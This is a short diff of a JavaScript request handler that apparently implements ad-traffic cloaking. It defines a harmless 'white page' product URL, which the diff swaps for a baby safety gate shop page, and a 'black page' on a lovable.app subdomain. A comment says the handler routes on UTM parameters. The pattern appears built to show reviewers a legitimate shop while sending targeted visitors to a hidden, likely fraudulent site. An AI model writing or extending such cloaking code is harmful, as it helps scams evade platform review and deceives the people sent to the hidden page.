@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://sebra-interior.com/collections/play/products/hide-seek-tree-stump-activity-toy-brown";
+    const whitePageURL = "https://www.babysafety.ie/babydan-premier-true-pressure-fit-safety-gate-black-73-5-79-6cm/";
     const blackPageURL = "https://casssshlov.lovable.app";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
